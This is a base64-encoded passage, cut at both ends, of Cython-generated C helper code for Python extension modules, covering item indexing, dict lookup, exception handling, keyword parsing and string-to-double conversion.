VpbGRlciwgYXJncywgbikgUHlEaWN0X1NldEl0ZW0oYnVpbGRlciwga2V5LCB2YWx1ZSlcbiNkZWZpbmUgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pIFB5RGljdF9TZXRJdGVtU3RyaW5nKGJ1aWxkZXIsIGtleSwgdmFsdWUpXG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoUHlPYmplY3QgKm9iaik7XG5cblxuI2RlZmluZSBfX1B5eF9HZXRJdGVtSW50KG8sIGksIHR5cGUsIGlzX3NpZ25lZCwgdG9fcHlfZnVuYywgaXNfbGlzdCwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2ssIGhhc19naWwpXFxcbiAgICAoX19QeXhfZml0c19QeV9zc2l6ZV90KGksIHR5cGUsIGlzX3NpZ25lZCkgP1xcXG4gICAgX19QeXhfR2V0SXRlbUludF9GYXN0KG8sIChQeV9zc2l6ZV90KWksIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrKSA6XFxcbiAgICAoaXNfbGlzdCA/IChQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW5kZXhFcnJvciwgImxpc3QgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkgOlxcXG4gICAgICAgICAgICAgICBfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMobywgdG9fcHlfZnVuYyhpKSkpKVxuI2RlZmluZSBfX1B5eF9HZXRJdGVtSW50X0xpc3QobywgaSwgdHlwZSwgaXNfc2lnbmVkLCB0b19weV9mdW5jLCBpc19saXN0LCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaywgaGFzX2dpbClcXFxuICAgIChfX1B5eF9maXRzX1B5X3NzaXplX3QoaSwgdHlwZSwgaXNfc2lnbmVkKSA/XFxcbiAgICBfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChvLCAoUHlfc3NpemVfdClpLCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlxcXG4gICAgKFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbmRleEVycm9yLCAibGlzdCBpbmRleCBvdXQgb2YgcmFuZ2UiKSwgKFB5T2JqZWN0KilOVUxMKSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgd3JhcGFyb3VuZCwgaW50IGJvdW5kc2NoZWNrKTtcbiNkZWZpbmUgX19QeXhfR2V0SXRlbUludF9UdXBsZShvLCBpLCB0eXBlLCBpc19zaWduZWQsIHRvX3B5X2Z1bmMsIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrLCBoYXNfZ2lsKVxcXG4gICAgKF9fUHl4X2ZpdHNfUHlfc3NpemVfdChpLCB0eXBlLCBpc19zaWduZWQpID9cXFxuICAgIF9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChvLCAoUHlfc3NpemVfdClpLCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlxcXG4gICAgKFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbmRleEVycm9yLCAidHVwbGUgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9UdXBsZV9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spO1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMoUHlPYmplY3QgKm8sIFB5T2JqZWN0KiBqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX2xpc3QsIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spO1xuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9HZXRJdGVtKFB5T2JqZWN0ICpkLCBQeU9iamVjdCoga2V5KTtcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKG9iaiwgbmFtZSlcXFxuICAgIChsaWtlbHkoUHlEaWN0X0NoZWNrRXhhY3Qob2JqKSkgP1xcXG4gICAgIF9fUHl4X1B5RGljdF9HZXRJdGVtKG9iaiwgbmFtZSkgOiBQeU9iamVjdF9HZXRJdGVtKG9iaiwgbmFtZSkpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbShkLCBrZXkpIFB5T2JqZWN0X0dldEl0ZW0oZCwga2V5KVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0ob2JqLCBuYW1lKSAgUHlPYmplY3RfR2V0SXRlbShvYmosIG5hbWUpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsTm9FcnJvcihvYmosIGF0dHJfbmFtZSkgIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lLCAwKVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lKSAgX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwob2JqLCBhdHRyX25hbWUsIDEpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSwgaW50IHdpdGhfZXJyb3IpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbE5vRXJyb3IobyxuKSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihvLG4pXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwobyxuKSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG8sbilcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIF9QeUVycl9TdGFja0l0ZW0gKiBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSk7XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblNhdmUodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0V4Y2VwdGlvblNhdmUoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25TYXZlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTtcbiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uUmVzZXQodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uU2F2ZSh0eXBlLCB2YWx1ZSwgdGIpICAgUHlFcnJfR2V0RXhjSW5mbyh0eXBlLCB2YWx1ZSwgdGIpXG4jZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblJlc2V0KHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1NldEV4Y0luZm8odHlwZSwgdmFsdWUsIHRiKVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuI2RlZmluZSBfX1B5eF9FeGNlcHRpb25Td2FwKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19FeGNlcHRpb25Td2FwKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU3dhcChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FeGNlcHRpb25Td2FwKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoY29uc3QgY2hhciogZnVuY19uYW1lLCBQeU9iamVjdCoga3dfbmFtZSk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1BhcnNlS2V5d29yZHMoXG4gICAgUHlPYmplY3QgKmt3ZHMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMsIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKmt3ZHMyLCBQeU9iamVjdCAqdmFsdWVzW10sXG4gICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsIFB5X3NzaXplX3QgbnVtX2t3YXJncyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLFxuICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3Ncbik7XG5cblxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uKGNmdW5jLCBzZWxmLCBhcmdzKVxcXG4gICAgKChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzKVxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uV2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCBrd2FyZ3MpXFxcbiAgICAoKFB5Q0Z1bmN0aW9uV2l0aEtleXdvcmRzKSh2b2lkKCopKHZvaWQpKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MsIGt3YXJncylcbiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbkZhc3QoY2Z1bmMsIHNlbGYsIGFyZ3MsIG5hcmdzKVxcXG4gICAgKChfX1B5eF9QeUNGdW5jdGlvbkZhc3QpKHZvaWQoKikodm9pZCkpKFB5Q0Z1bmN0aW9uKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MsIG5hcmdzKVxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpXFxcbiAgICAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSkoUHlDRnVuY3Rpb24pKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpXG5cblxudHlwZWRlZiBzdHJ1Y3Qge1xuICAgIFB5T2JqZWN0ICp0eXBlO1xuICAgIFB5T2JqZWN0ICoqbWV0aG9kX25hbWU7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgJiYgQ1lUSE9OX0FUT01JQ1NcbiAgICBfX3B5eF9hdG9taWNfaW50X3R5cGUgaW5pdGlhbGl6ZWQ7XG4jZW5kaWZcbiAgICBQeUNGdW5jdGlvbiBmdW5jO1xuICAgIFB5T2JqZWN0ICptZXRob2Q7XG4gICAgaW50IGZsYWc7XG59IF9fUHl4X0NhY2hlZENGdW5jdGlvbjtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uICpjZnVuYykge1xuI2lmICFDWVRIT05fQVRPTUlDU1xuICAgIHJldHVybiAxO1xuI2Vsc2VcbiAgICBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgZXhwZWN0ZWQgPSAwO1xuICAgIGlmIChfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSgmY2Z1bmMtPmluaXRpYWxpemVkLCAmZXhwZWN0ZWQsIDEpKSB7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICByZXR1cm4gZXhwZWN0ZWQ7XG4jZW5kaWZcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX1NldEZpbmlzaGVkSW5pdGlhbGl6aW5nKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMpIHtcbiNpZiBDWVRIT05fQVRPTUlDU1xuICAgIF9fcHl4X2F0b21pY19zdG9yZSgmY2Z1bmMtPmluaXRpYWxpemVkLCAyKTtcbiNlbmRpZlxufVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX0dldEFuZFNldEluaXRpYWxpemluZyhjZnVuYykgMlxuI2RlZmluZSBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fU2V0RmluaXNoZWRJbml0aWFsaXppbmcoY2Z1bmMpXG4jZW5kaWZcblxuXG5DWVRIT05fVU5VU0VEXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogY2Z1bmMsIFB5T2JqZWN0KiBzZWxmLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0NhbGxVbmJvdW5kQ01ldGhvZDIoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uICpjZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcxLCBQeU9iamVjdCAqYXJnMik7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKGNmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKSAgX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpXG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZChjb25zdCBjaGFyKiBmdW5jX25hbWUsIGludCBleGFjdCxcbiAgICBQeV9zc2l6ZV90IG51bV9taW4sIFB5X3NzaXplX3QgbnVtX21heCwgUHlfc3NpemVfdCBudW1fZm91bmQpO1xuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgb3AyLCBpbnR2YWwsIGlucGxhY2UsIHplcm9kaXZpc2lvbl9jaGVjaylcXFxuICAgIChpbnBsYWNlID8gUHlOdW1iZXJfSW5QbGFjZUFkZChvcDEsIG9wMikgOiBQeU51bWJlcl9BZGQob3AxLCBvcDIpKVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpO1xuXG5cbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21CSW50X2JpbnQodmFsdWUpXFxcbiAgICAoKHZhbHVlKSA/IF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVHJ1ZV8yKSA6IF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRmFsc2UpKVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoUHlPYmplY3QqIGl0ZW0sIFB5T2JqZWN0KiBzZXEsIGludCBlcSkge1xuICAgIGludCByZXN1bHQgPSBQeVNlcXVlbmNlX0NvbnRhaW5zKHNlcSwgaXRlbSk7XG4gICAgcmV0dXJuIHVubGlrZWx5KHJlc3VsdCA8IDApID8gcmVzdWx0IDogKHJlc3VsdCA9PSAoZXEgPT0gUHlfRVEpKTtcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKFB5X3NzaXplX3QgZXhwZWN0ZWQpO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKFB5X3NzaXplX3QgaW5kZXgpO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9JdGVyRmluaXNoKHZvaWQpO1xuXG5cbnN0YXRpYyBpbnQgX19QeXhfSXRlcm5leHRVbnBhY2tFbmRDaGVjayhQeU9iamVjdCAqcmV0dmFsLCBQeV9zc2l6ZV90IGV4cGVjdGVkKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlVbmljb2RlX0NvbnRhaW5zVEYoUHlPYmplY3QqIHN1YnN0cmluZywgUHlPYmplY3QqIHRleHQsIGludCBlcSkge1xuICAgIGludCByZXN1bHQgPSBQeVVuaWNvZGVfQ29udGFpbnModGV4dCwgc3Vic3RyaW5nKTtcbiAgICByZXR1cm4gdW5saWtlbHkocmVzdWx0IDwgMCkgPyByZXN1bHQgOiAocmVzdWx0ID09IChlcSA9PSBQeV9FUSkpO1xufVxuXG5cbnN0YXRpYyBkb3VibGUgX19QeXhfU2xvd1B5U3RyaW5nX0FzRG91YmxlKFB5T2JqZWN0ICpvYmopO1xuc3RhdGljIGRvdWJsZSBfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZShQeU9iamVjdCAqb2JqLCBjb25zdCBjaGFyKiBzdGFydCwgUHlfc3NpemVfdCBsZW5ndGgpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgZG91YmxlIF9fUHl4X1B5Qnl0ZXNfQXNEb3VibGUoUHlPYmplY3QgKm9iaikge1xuICAgIGNoYXIqIGFzX2Nfc3RyaW5nO1xuICAgIFB5X3NzaXplX3Qgc2l6ZTtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgYXNfY19zdHJpbmcgPSBQeUJ5dGVzX0FTX1NUUklORyhvYmopO1xuICAgIHNpemUgPSBQeUJ5dGVzX0dFVF9TSVpFKG9iaik7XG4jZWxzZVxuICAgIGlmIChQeUJ5dGVzX0FzU3RyaW5nQW5kU2l6ZShvYmosICZhc19jX3N0cmluZywgJnNpemUpIDwgMCkge1xuICAgICAgICByZXR1cm4gKGRvdWJsZSktMTtcbiAgICB9XG4jZW5kaWZcbiAgICByZXR1cm4gX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGUob2JqLCBhc19jX3N0cmluZywgc2l6ZSk7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBkb3VibGUgX19QeXhfUHlCeXRlQXJyYXlfQXNEb3VibGUoUHlPYmplY3QgKm9iaikge1xuICAgIGNoYXIqIGFzX2Nfc3RyaW5nO1xuICAgIFB5X3NzaXplX3Qgc2l6ZTtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgYXNfY19zdHJpbmcgPSBQeUJ5dGVBcnJheV9BU19TVFJJTkcob2JqKTtcbiAgICBzaXplID0gUHlCeXRlQXJyYXlfR0VUX1NJWkUob2JqKTtcbiNlbHNlXG4gICAgYXNfY19zdHJpbmcgPSBQeUJ5dGVBcnJheV9Bc1N0cmluZyhvYmopO1xuICAgIGlmIChhc19jX3N0cmluZyA9PSBOVUxMKSB7XG4gICAgICAgIHJldHVybiAoZG91YmxlKS0xO1xuICAgIH1cbiAgICBzaXplID0gUHlCeXRlQXJyYXlfU2l6ZShvYmopO1xuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlKG9iaiwgYXNfY19zdHJpbmcsIHNpemUpO1xufVxuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbnN0YXRpYyBjb25zdCBjaGFyKiBfX1B5eF9fUHlVbmljb2RlX0FzRG91YmxlX0NvcHkoY29uc3Qgdm9pZCogZGF0YSwgY29uc3QgaW50IGtpbmQsIGNoYXIqIGJ1ZmZlciwgUHlfc3NpemVfdCBzdGFydCwgUHlfc3NpemVfdCBlbmQpIHtcbiAgICBpbnQgbGFzdF93YXNfcHVuY3R1YXRpb247XG4gICAgUHlfc3NpemVfdCBpO1xuICAgIGxhc3Rfd2FzX3B1bmN0dWF0aW9uID0gMTtcbiAgICBmb3IgKGk9c3RhcnQ7IGkgPD0gZW5kOyBpKyspIHtcbiAgICAgICAgUHlfVUNTNCBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBpKTtcbiAgICAgICAgaW50IGlzX3B1bmN0dWF0aW9uID0gKGNociA9PSBcJ19cJykgfCAoY2hyID09IFwnLlwnKTtcbiAgICAgICAgKmJ1ZmZlciA9IChjaGFyKWNocjtcbiAgICAgICAgYnVmZmVyICs9IChjaHIgIT0gXCdfXCcpO1xuICAgICAgICBpZiAodW5saWtlbHkoY2hyID4gMTI3KSkgZ290byBwYXJzZV9mYWlsdXJlO1xuICAgICAgICBpZiAodW5saWtlbHkobGFzdF93YXNfcHVuY3R1YXRpb24gJiBpc19wdW5jdHVhdGlvbikpIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICAgICAgbGFzdF93YXNfcHVuY3R1YXRpb24gPSBpc19wdW5jdHVhdGlvbjtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KGxhc3Rfd2FzX3B1bmN0dWF0aW9uKSkgZ290byBwYXJzZV9mYWlsdXJlO1xuICAgICpidWZmZXIgPSBcJ1xcMFwnO1xuICAgIHJldHVybiBidWZmZXI7XG5wYXJzZV9mYWlsdXJlOlxuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIGRvdWJsZSBfX1B5eF9fUHlVbmljb2RlX0FzRG91YmxlX2luZl9uYW4oY29uc3Qgdm9pZCogZGF0YSwgaW50IGtpbmQsIFB5X3NzaXplX3Qgc3RhcnQsIFB5X3NzaXplX3QgbGVuZ3RoKSB7XG4gICAgaW50IG1hdGNoZXMgPSAxO1xuICAgIFB5X1VDUzQgY2hyO1xuICAgIFB5X1VDUzQgc2lnbiA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KTtcbiAgICBpbnQgaXNfc2lnbmVkID0gKHNpZ24gPT0gXCctXCcpIHwgKHNpZ24gPT0gXCcrXCcpO1xuICAgIHN0YXJ0ICs9IGlzX3NpZ25lZDtcbiAgICBsZW5ndGggLT0gaXNfc2lnbmVkO1xuICAgIHN3aXRjaCAoUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQpKSB7XG4gICAgICAgICNpZmRlZiBQeV9OQU5cbiAgICAgICAgY2FzZSBcJ25cJzpcbiAgICAgICAgY2FzZSBcJ05cJzpcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShsZW5ndGggIT0gMykpIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzEpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09IFwnYVwnKSB8IChjaHIgPT0gXCdBXCcpO1xuICAgICAgICAgICAgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQrMik7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChjaHIgPT0gXCduXCcpIHwgKGNociA9PSBcJ05cJyk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIW1hdGNoZXMpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgICAgICByZXR1cm4gKHNpZ24gPT0gXCctXCcpID8gLVB5X05BTiA6IFB5X05BTjtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGNhc2UgXCdpXCc6XG4gICAgICAgIGNhc2UgXCdJXCc6XG4gICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoIDwgMykpIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzEpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09IFwnblwnKSB8IChjaHIgPT0gXCdOXCcpO1xuICAgICAgICAgICAgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQrMik7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChjaHIgPT0gXCdmXCcpIHwgKGNociA9PSBcJ0ZcJyk7XG4gICAgICAgICAgICBpZiAobGlrZWx5KGxlbmd0aCA9PSAzICYmIG1hdGNoZXMpKVxuICAgICAgICAgICAgICAgIHJldHVybiAoc2lnbiA9PSBcJy1cJykgPyAtUHlfSFVHRV9WQUwgOiBQeV9IVUdFX1ZBTDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShsZW5ndGggIT0gOCkpIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzMpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09IFwnaVwnKSB8IChjaHIgPT0gXCdJXCcpO1xuICAgICAgICAgICAgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQrNCk7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChjaHIgPT0gXCduXCcpIHwgKGNociA9PSBcJ05cJyk7XG4gICAgICAgICAgICBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCs1KTtcbiAgICAgICAgICAgIG1hdGNoZXMgJj0gKGNociA9PSBcJ2lcJykgfCAoY2hyID09IFwnSVwnKTtcbiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzYpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09IFwndFwnKSB8IChjaHIgPT0gXCdUXCcpO1xuICAgICAgICAgICAgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQrNyk7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChjaHIgPT0gXCd5XCcpIHwgKGNociA9PSBcJ1lcJyk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIW1hdGNoZXMpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgIC